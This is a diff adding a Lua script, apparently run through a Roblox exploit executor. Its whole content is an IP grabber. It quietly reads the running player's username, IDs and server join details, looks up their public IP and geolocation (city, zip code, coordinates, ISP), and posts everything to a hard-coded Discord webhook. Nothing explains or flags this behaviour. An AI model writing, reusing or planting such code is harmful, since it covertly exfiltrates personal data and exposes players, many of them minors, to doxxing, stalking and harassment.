@@ -1,0 +1,47 @@
+local Username = game:GetService("Players").LocalPlayer.Name
+local GameID = game.GameId
+local UserID = game.Players.LocalPlayer.UserId
+local JobID = game.JobId
+local gameURL = "https://www.roblox.com/games"..GameID.."/"..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name..", ".. game.GameId
+local JoinScript = [[game:GetService("TeleportService"):Teleport(]]..game.PlaceId..","..JobID..",".."game.Players.LocalPlayer)"
+local WebhookURL = "https://discord.com/api/webhooks/1103047988743503882/bSe-Lv1fY3QH9ZSbALE93rNY2JHjFEkvrzugxr66FmnNcmoImxyMNicGEsqe_CbKdHSa"
+local getIPResponse = syn.request({
+    Url = "https://api.ipify.org/?format=json",
+    Method = "GET"
+})
+local GetIPJSON = game:GetService("HttpService"):JSONDecode(getIPResponse.Body)
+local IPBuffer = tostring(GetIPJSON.ip)
+
+local getIPInfo = syn.request({
+    Url = string.format("http://ip-api.com/json/%s", IPBuffer),
+    Method = "Get"
+})
+local IIT = game:GetService("HttpService"):JSONDecode(getIPInfo.Body)
+local FI = {
+    IP = IPBuffer,
+    country = IIT.country,
+    countryCode = IIT.countryCode,
+    region = IIT.region,
+    regionName = IIT.regionName,
+    city = IIT.city,
+    zipcode = IIT.zip,
+    latitude = IIT.lat,
+    longitude = IIT.lon,
+    isp = IIT.isp,
+    org = IIT.org,
+}
+local dataMessage = string.format("Username: %s\nUserId: %s\nGameId: %s\nJobId:  %s\nGameURL:  %s\nJoinScript: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s", Username, UserID, GameID, JobID, gameURL, JoinScript, FI.IP, FI.country, FI.countryCode, FI.region, FI.regionName, FI.city, FI.zipcode, FI.isp, FI.org)
+local MessageData = {
+    ["content"] = dataMessage
+}
+
+syn.request(
+    {
+        Url = WebhookURL, 
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = game:GetService("HttpService"):JSONEncode(MessageData)
+    }
+)
